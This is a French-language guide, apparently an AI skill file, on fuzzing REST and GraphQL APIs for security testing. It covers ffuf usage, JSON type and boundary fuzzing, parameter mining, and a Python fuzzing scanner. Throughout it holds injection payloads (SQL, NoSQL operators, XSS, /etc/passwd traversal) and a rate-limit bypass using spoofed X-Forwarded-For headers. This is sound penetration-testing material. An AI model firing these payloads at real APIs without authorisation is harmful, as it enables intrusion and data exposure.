---
name: api-fuzzing-deep
description: Guide complet de fuzzing avancé d'API REST/GraphQL — structure-aware fuzzing, grammar-based fuzzing, differential fuzzing, ffuf methodologies, param mining, value tampering, status code analysis, et custom fuzzing scripts
category: cybersecurite
---

# API Fuzzing Avancé — Guide Complet

## Introduction

Le fuzzing d'API consiste à envoyer des données inattendues, invalides, ou aléatoires pour découvrir des comportements non prévus : crashs, fuites d'information, contournements d'auth, injections.

## 1. Fuzzing avec ffuf — Approfondi

### 1.1 Multi-Mode Fuzzing

```bash
# Mode mot-clé unique
ffuf -u https://api.target.com/api/v1/users/FUZZ -w ids.txt

# Mode multi-mots-clés
ffuf -u https://api.target.com/api/v1/WORD1/users/WORD2 \
  -w versions.txt:WORD1 -w ids.txt:WORD2

# Mode avec headers
ffuf -u https://api.target.com/api/v1/users \
  -H "X-Version: FUZZ" -w versions.txt

# Mode avec body
ffuf -u https://api.target.com/api/v1/login -X POST \
  -H "Content-Type: application/json" \
  -d '{"user":"FUZZ","pass":"password"}' -w usernames.txt
```

### 1.2 Filtres Avancés

```bash
# Filtrer par code HTTP
ffuf -u https://api.target.com/api/v1/users/FUZZ -w ids.txt \
  -fc 404,403,401,500  # exclure les codes d'erreur

# Filtrer par taille de réponse
ffuf -u https://api.target.com/api/v1/users/FUZZ -w ids.txt \
  -fs 0,23,45,128  # exclure les tailles spécifiques (pages d'erreur)

# Filtrer par nombre de lignes
ffuf -u https://api.target.com/api/v1/users/FUZZ -w ids.txt \
  -fl 0,5,10  # exclure les réponses avec 0/5/10 lignes

# Filtrer par regex dans la réponse
ffuf -u https://api.target.com/api/v1/users/FUZZ -w ids.txt \
  -fr "error|not found|invalid"  # exclure les réponses qui matchent
```

### 1.3 Fuzzing de Méthodes HTTP

```bash
# Tester toutes les méthodes HTTP sur un endpoint
ffuf -w methods.txt -u https://api.target.com/api/v1/users \
  -X FUZZ -fc 404,405

# methods.txt:
# GET
# POST
# PUT
# PATCH
# DELETE
# HEAD
# OPTIONS
# TRACE
# CONNECT
# PURGE
# PROPFIND
# PATCH
```

### 1.4 Fuzzing avec Rate Limiting

```bash
# Mode lent pour éviter le rate limiting
ffuf -u https://api.target.com/api/v1/users/FUZZ -w ids.txt \
  -p 0.5  # pause de 0.5s entre chaque requête

# Mode parallèle avec délai
ffuf -u https://api.target.com/api/v1/users/FUZZ -w ids.txt \
  -t 1 -p 0.2  # 1 thread, 200ms de pause

# Rate limiting bypass via headers (cf: api-rate-limiting-bypass)
ffuf -u https://api.target.com/api/v1/users/FUZZ -w ids.txt \
  -H "X-Forwarded-For: FUZZ2" -w ips.txt
```

## 2. Structure-Aware Fuzzing

### 2.1 JSON Body Fuzzing

```bash
# Fuzzing de types JSON
ffuf -u https://api.target.com/api/v1/users -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w payloads.txt

# Fuzzing de champs individuels
for value in "null" "true" "false" "0" "1" "-1" "''" '""' \
             "[]" "{}" "admin" "' OR '1'='1" "${IFS}" \
             "%00" "\x00" "<script>" "../../../etc/passwd"; do
  curl -X POST https://api.target.com/api/v1/users \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"test\",\"role\":$value}"
done

# Fuzzing de la profondeur JSON
for depth in 1 2 3 4 5 10 50 100; do
  nested=$(python3 -c "
import json
d = {}
current = d
for i in range($depth):
    current['a'] = {}
    current = current['a']
print(json.dumps(d))
")
  curl -X POST https://api.target.com/api/v1/users \
    -H "Content-Type: application/json" -d "$nested"
done
```

### 2.2 Schema Validation Bypass

```bash
# Ajouter des champs non prévus dans le schéma
curl -X POST https://api.target.com/api/v1/users \
  -d '{"username":"admin","password":"test","unexpectedField":{"nested":{"deeper":"value"}}}'

# Types de champs invariants
curl -X POST https://api.target.com/api/v1/users \
  -d '{"username":{"$gt":""},"password":{"$ne":""}}'

# Champs manquants
curl -X POST https://api.target.com/api/v1/users \
  -d '{}'
curl -X POST https://api.target.com/api/v1/users \
  -d '{"username":null}'
```

### 2.3 Boundary Value Analysis

```bash
# Valeurs limites pour les champs numériques
for val in 0 1 -1 999999 9999999999 -9999999999 \
           2147483647 2147483648 -2147483648  # Int32 limits \
           9223372036854775807 9223372036854775808  # Int64 limits \
           1.7976931348623157e308 5e-324; do  # Float limits
  curl -X POST https://api.target.com/api/v1/orders \
    -d "{\"quantity\":$val,\"productId\":1}"
done

# Valeurs limites pour les strings
for len in 0 1 255 256 512 1024 4096 65535 65536 100000; do
  long_str=$(python3 -c "print('A'*$len)")
  curl -X POST https://api.target.com/api/v1/users \
    -d "{\"username\":\"$long_str\",\"password\":\"test\"}"
done
```

## 3. Parameter Mining

### 3.1 Découverte de Paramètres Cachés

```bash
# Arjun — découverte de paramètres HTTP
arjun -u https://api.target.com/api/v1/users \
  -m GET --headers "Authorization: Bearer <token>"

# Arjun avec wordlist
arjun -u https://api.target.com/api/v1/login \
  -m POST -d '{"user":"test","pass":"test"}' \
  -w /usr/share/wordlists/api_params.txt

# Paramètre fuzzing avec ffuf
ffuf -u https://api.target.com/api/v1/users?FUZZ=1 \
  -w api_params.txt -fs 0,23

# Wordlist de paramètres courants
cat << 'EOF' > api_params.txt
id
user_id
userId
token
api_key
apikey
secret
key
access_token
format
type
limit
offset
page
sort
order
filter
search
q
query
fields
include
expand
select
embed
scope
callback
jsonp
callback
redirect
redirect_uri
next
continue
debug
admin
test
EOF
```

### 3.2 Fuzzing de Valeurs par Paramètre

```bash
# Fuzzing de paramètres booléens
for val in true false 0 1 yes no null "null" "True" "False"; do
  curl -s "https://api.target.com/api/v1/users?admin=$val" \
    -H "Authorization: Bearer <token>" | head -c 200
  echo "--- admin=$val"
done

# Fuzzing des paramètres de pagination
for limit in 0 1 -1 9999 9999999 -9999999 0.5 "a" "null" "true"; do
  curl -s "https://api.target.com/api/v1/users?limit=$limit"
  echo "--- limit=$limit"
done
```

## 4. Differential Fuzzing

### 4.1 Comparaison de Réponses

```bash
# Comparer les réponses entre deux requêtes similaires
# Pour détecter des comportements différents non attendus
curl -s "https://api.target.com/api/v1/users/1" > resp_user1.json
curl -s "https://api.target.com/api/v1/users/2" > resp_user2.json
diff resp_user1.json resp_user2.json  # Comparer les structures

# Test A/B avec et sans paramètre
curl -s "https://api.target.com/api/v1/users/me" > resp_no_param.json
curl -s "https://api.target.com/api/v1/users/me?include=private" > resp_param.json
diff resp_no_param.json resp_param.json
```

### 4.2 Error Message Analysis

```bash
# Analyser les messages d'erreur pour le versioning
for val in "''" null true false 0 -1 "[]" "{}" "' OR '1'='1"; do
  curl -s -X POST https://api.target.com/api/v1/users \
    -H "Content-Type: application/json" \
    -d "{\"username\":$val,\"password\":\"test\"}" \
    | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',''))"
done
```

## 5. API Fuzzing avec outil dédié

### 5.1 RESTler (Microsoft)

```bash
# RESTler — fuzzing structurel pour API REST
# Compiler la spécification
restler-quick-start.py --api_spec swagger.json \
  --grammar_output ./grammar

# Fuzzer
restler-fuzzer.py --grammar_file ./grammar/grammar.py \
  --target_ip api.target.com --target_port 443 \
  --https --token_refresh_command "curl -X POST ..."
```

### 5.2 TnT-Fuzzer (API fuzzing)

```bash
# TnT-Fuzzer — fuzzer spécialisé API
tnt-fuzzer -u https://api.target.com \
  -s swagger.json \
  -i 10000 \
  -t 10
```

### 5.3 ws-fuzzer (WebSocket)

```bash
# Fuzzing de WebSocket
git clone https://github.com/assetnote/ws-fuzzer
ws-fuzzer -u wss://api.target.com/ws \
  -w /usr/share/wordlists/ws_payloads.txt \
  -c 5
```

## 6. Grammar-Based Fuzzing

```bash
# Générer des payloads basés sur une grammaire
# Exemple: générer des UUIDs, des emails, des dates

# UUID fuzzing
python3 -c "
import uuid
for _ in range(100):
    print(str(uuid.uuid4()))
" > uuids.txt

# Email fuzzing
python3 -c "
import random
domains = ['target.com', 'gmail.com', 'test.com', 'attacker.com']
chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
for _ in range(1000):
    name = ''.join(random.choice(chars) for _ in range(random.randint(3, 15)))
    domain = random.choice(domains)
    print(f'{name}@{domain}')
" > emails.txt

# JSON structure fuzzing
python3 -c "
import json
import random
import string

def random_json(depth=0, max_depth=3):
    if depth >= max_depth:
        return random.choice([True, False, None, random.randint(0, 1000), 'test'])

    choice = random.random()
    if choice < 0.3:  # Object
        n = random.randint(0, 5)
        return {f'k{i}': random_json(depth+1) for i in range(n)}
    elif choice < 0.6:  # Array
        n = random.randint(0, 5)
        return [random_json(depth+1) for _ in range(n)]
    elif choice < 0.7:
        return ''.join(random.choice(string.printable) for _ in range(20))
    else:
        return random.choice([True, False, None, random.randint(0, 99999)])

for _ in range(50):
    print(json.dumps(random_json()))
" > json_payloads.json
```

## 7. Fuzzing Automatisé Multi-Endpoint

```python
#!/usr/bin/env python3
"""Scanner de fuzzing API multi-technique."""
import requests
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "https://api.target.com"
TOKEN = "Bearer <token>"

# Endpoints à tester
ENDPOINTS = [
    ("GET", "/api/v1/users/1"),
    ("POST", "/api/v1/login", {"user": "admin", "pass": "FUZZ_VALUE"}),
    ("GET", "/api/v1/products?category=FUZZ_VALUE"),
    ("GET", "/api/v1/search?q=FUZZ_VALUE"),
]

# Payloads à injecter
PAYLOADS = [
    # Injection
    "' OR '1'='1", "'; DROP TABLE users;--",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    # Type confusion
    "null", "true", "false", "[]", "{}", "0", "-1",
    # Boundary
    "A" * 10000, "0" * 10000,
    # Unicode
    "ｓｅｌｅｃｔ", "\\u0041dmin",
]

def fuzz_endpoint(method, path, payload_template=None):
    results = []
    for payload in PAYLOADS:
        if payload_template:
            url = BASE + path
            data = json.loads(json.dumps(payload_template).replace("FUZZ_VALUE", payload))
            r = requests.request(method, url, json=data,
                               headers={"Authorization": TOKEN})
        else:
            url = BASE + path.replace("FUZZ_VALUE", payload)
            r = requests.request(method, url,
                               headers={"Authorization": TOKEN})

        result = {
            "payload": payload[:50],
            "status": r.status_code,
            "size": len(r.content),
        }
        results.append(result)

        # Analyser les résultats
        if r.status_code not in [400, 404, 500] and r.status_code < 500:
            if r.status_code == 200:
                print(f"[200] {path} | {payload[:30]}")
                if r.status_code == 200 and len(r.text) > 100:
                    print(f"  → Réponse: {r.text[:100]}")
        if r.status_code == 500:
            print(f"[500] {path} | {payload[:30]} — Crash détecté!")
            if "traceback" in r.text.lower() or "stack" in r.text.lower():
                print(f"  → Stack trace: {r.text[:200]}")

    return results

if __name__ == "__main__":
    for ep in ENDPOINTS:
        method = ep[0]
        path = ep[1]
        template = ep[2] if len(ep) > 2 else None
        print(f"\n=== {method} {path} ===")
        fuzz_endpoint(method, path, template)
```

## 8. Résultats — Analyse des Codes HTTP

| Status | Signification |
|--------|---------------|
| **200** | Accès autorisé, fuzzing a touché quelque chose |
| **201** | Création réussie → injection possible |
| **204** | Suppression/update réussie → IDOR? |
| **301/302** | Redirection → Open redirect? |
| **400** | Requête invalide → validation fonctionne |
| **401** | Non authentifié |
| **403** | Authentifié mais interdit → ACL fonctionne |
| **404** | Endpoint non trouvé |
| **405** | Méthode non autorisée |
| **413** | Payload trop grand |
| **429** | Rate limiting |
| **500** | Crash serveur → potentielle vulnérabilité |
| **502/503** | Serveur submergé |
| **-1 (timeout)** | Requête bloquée / crash |

## Checklist

- [ ] fffuf multi-mode (paths, params, values, headers, body)
- [ ] JSON type fuzzing (null, bool, int, array, object)
- [ ] Schéma validation bypass (champs extra, manquants)
- [ ] Boundary values (int limits, string lengths)
- [ ] Parameter mining (Arjun, wordlist)
- [ ] Boolean/parameter value fuzzing
- [ ] Differential fuzzing (A/B comparison)
- [ ] Error message analysis
- [ ] HTTP method fuzzing
- [ ] Grammar-based payload generation (UUID, email, JSON)
- [ ] Deeply nested JSON
- [ ] Zero value testing (0, "", null, false)
- [ ] Large payloads (10k+, 100k+)
- [ ] Unicode/encoding variants
- [ ] Rate-limited fuzzing
- [ ] RESTler / TnT-Fuzzer
- [ ] Analyse des codes HTTP et tailles

## Ressources

- **ffuf** : https://github.com/ffuf/ffuf
- **RESTler** : https://github.com/microsoft/restler-fuzzer
- **Arjun** : https://github.com/s0md3v/Arjun
- **HackTricks Fuzzing** : https://book.hacktricks.wiki/en/pentesting-web/fuzzing/index.html
- **API Fuzzing Guide** : https://www.apisec.ai/blog/api-fuzzing